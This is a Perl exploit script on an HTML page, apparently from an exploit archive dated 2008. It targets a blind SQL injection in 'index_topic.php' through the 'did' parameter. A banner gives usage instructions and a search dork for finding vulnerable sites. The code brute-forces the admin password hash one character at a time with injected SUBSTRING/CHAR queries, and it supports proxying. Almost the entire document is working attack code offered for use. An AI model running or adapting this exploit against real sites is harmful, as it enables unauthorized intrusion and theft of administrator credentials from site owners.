<html><head><title>DIY (index_topic did ) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;
if(!$ARGV[1])
{
  print &quot;                                                                  \n&quot;;
  print &quot;   ################## VIVA ISlAME VIVA ISLAME ####################\n&quot;;
  print &quot;   ################## VIVA ISlAME VIVA ISLAME ####################\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##   DIY Blind SQL Injection Exploit ( index_topic did )     ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##   Author: Mr.SQL                                          ##\n&quot;;
  print &quot;   ##   EMAIL : SQL&lt;at&gt;HOTMAIL.IT                                   ##\n&quot;;
  print &quot;   ##   HOME  : WwW.PaL-HaCkEr.CoM                              ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##              -((:: GrE3E3E3E3E3ETZz ::))-                 ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ## - HaCkEr_EGy - His0k4 - Dark MaSTer - MoHaMaD AL 3rab -   ##\n&quot;;
  print &quot;   ##              - ALwHeD -  HeBarIeH   -                     ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##               &lt;&lt;&gt;&gt;   MuSliMs HaCkErS   &lt;&lt;&gt;&gt;               ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##   Usage  : perl exploit.pl host                           ##\n&quot;;
  print &quot;   ##   Example: perl exploit.pl www.host.com / -d 10           ##\n&quot;;
  print &quot;   ##   D0rk   : allinurl: index_topic.php did                  ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ##   Options:                                                ##\n&quot;;
  print &quot;   ##     -d    valid did  value                                ##\n&quot;;
  print &quot;   ##   Note:                                                   ##\n&quot;;
  print &quot;   ##   Don't forget to change the match if you have to do it   ##\n&quot;;
  print &quot;   ##                                                           ##\n&quot;;
  print &quot;   ###############################################################\n&quot;;
  print &quot;   ###############################################################\n&quot;;
  exit;
}
my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $userid  = 1;
my $did     = $ARGV[2];
my %options = ();
GetOptions(\%options, &quot;u=i&quot;, &quot;p=s&quot;, &quot;d=i&quot;);
print &quot;[~] Exploiting...\n&quot;;
if($options{&quot;u&quot;})
{
  $userid = $options{&quot;u&quot;};
}
if($options{&quot;d&quot;})
{
  $did = $options{&quot;d&quot;};
}
syswrite(STDOUT, &quot;[~] MD5-Hash: &quot;, 14);
for(my $i = 1; $i &lt;= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f &amp;&amp; $h &lt;= 57)
  {
    if(istrue2($host, $path, $userid, $did, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f &amp;&amp; $h &lt;= 122)
    {
      if(istrue2($host, $path, $userid, $did, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}
print &quot;\n[~] Exploiting done\n&quot;;
sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $uid   = shift;
  my $did   = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent-&gt;new;
  my $query = &quot;http://&quot;.$host.$path.&quot;index_topic.php?did=&quot;.$did.&quot; and (SUBSTRING((SELECT password FROM admin LIMIT 0,1),&quot;.$i.&quot;,1))=CHAR(&quot;.$h.&quot;)&quot;;
 
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
 
  my $resp = $ua-&gt;get($query);
  my $content = $resp-&gt;content;
  my $regexp = &quot;tourterms.pdf&quot;;
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2008-06-14]</pre></html>